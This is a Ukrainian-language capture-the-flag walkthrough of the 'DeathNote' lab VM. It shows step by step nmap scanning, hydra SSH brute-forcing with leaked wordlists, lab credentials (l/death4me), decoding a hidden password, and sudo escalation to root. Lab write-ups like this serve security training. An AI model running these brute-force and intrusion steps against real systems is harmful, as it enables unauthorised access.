# DeathNote

Розвідка мережі.

```
ip a
```

```
fping -asgq 192.168.88.0/24
```

![](Screenshot_2026-07-24_13-47-47.png)

Повне сканування портів цілі.

```
sudo nmap -sS 192.168.88.84 -p-
```

![](Screenshot_2026-07-24_13-53-12.png)

Деталізуємо сервіси.

```
sudo nmap -sCV -A -O -p80,22 192.168.88.84 -T5
```

![](Screenshot_2026-07-24_13-53-47.png)

Додаємо домен в hosts.

```
sudo nano /etc/hosts
192.168.88.84 deathnote.vuln
```

![](Screenshot_2026-07-24_13-47-55.png)

![](Screenshot_2026-07-24_13-49-17.png)

![](Screenshot_2026-07-24_13-51-13.png)

![](Screenshot_2026-07-24_13-54-56.png)

Хінт каже шукати notes.txt. Через вихідний код видно шлях до uploads.

```
http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/
```

![](Screenshot_2026-07-24_13-56-22.png)

![](Screenshot_2026-07-24_13-56-29.png)

В лістингу директорії: notes.txt і user.txt.

```
http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
```

```
http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt
```

![](Screenshot_2026-07-24_13-57-09.png)

![](Screenshot_2026-07-24_13-57-40.png)

Брутфорс SSH цими списками логінів/паролів.

```
hydra -L user.txt -P notes.txt ssh://192.168.88.84
```

![](Screenshot_2026-07-24_14-04-29.png)

Знайдено l / death4me. Заходимо по SSH.

```
ssh l@192.168.88.84
```

![](Screenshot_2026-07-24_14-05-20.png)

user.txt на диску виявився brainfuck кодом.

```
cat user.txt
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.
```

![](Screenshot_2026-07-24_14-06-44.png)

Декодуємо повідомлення від Kira.

```
i think u got the shell , but you wont be able to kill me -kira
```

![](Screenshot_2026-07-24_14-07-07.png)

Шукаємо далі по системі, в /opt.

```
cd /opt
cd L
cd kira-case
ls
cat case-file.txt
the FBI agent died on December 27, 2006

1 week after the investigation of the task-force member/head.
aka.....
Soichiro Yagami's family .


hmmmmmmmmm......
and according to watari ,
he died as other died after Kira targeted them .


and we also found something in
fake-notebook-rule folder .
```

```
cd fake-notebook-rule/
ls
cat hint
use cyberchef
cat case.wav
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
```

![](Screenshot_2026-07-24_14-08-53.png)

Hex → Base64 в CyberChef дає пароль kira.

![](Screenshot_2026-07-24_14-25-31.png)

Переходимо на kira з цим паролем.

```
su kira
```

![](Screenshot_2026-07-24_14-10-46.png)

Перевіряємо sudo права — дозволено все.

```
sudo -l
sudo su
```

![](Screenshot_2026-07-24_14-11-23.png)

Root отримано.

```
 cd /root
 cat root.txt


      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       ::::::::
    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+:
   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+
  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++
 +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+
#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#
########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########

##########follow me on twitter###########3
and share this screen shot and tag @KDSAMF
```
